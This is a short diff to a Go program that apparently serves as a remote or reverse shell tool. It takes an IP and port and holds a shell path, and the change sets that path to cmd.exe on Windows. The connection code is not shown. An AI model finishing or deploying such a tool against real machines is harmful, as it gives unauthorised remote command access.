@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/exec"
 	"path"
+	"runtime"
 	"syscall"
 )
 
@@ -19,6 +20,11 @@ var (
 )
 
 func main() {
+
+	if runtime.GOOS == "windows" {
+		shell = "c:\\windows\\system32\\cmd.exe"
+	}
+
 	if len(os.Args) < 3 {
 		fmt.Printf("Usage: %s [ip] [port]\n", path.Base(os.Args[0]))
 		os.Exit(0)
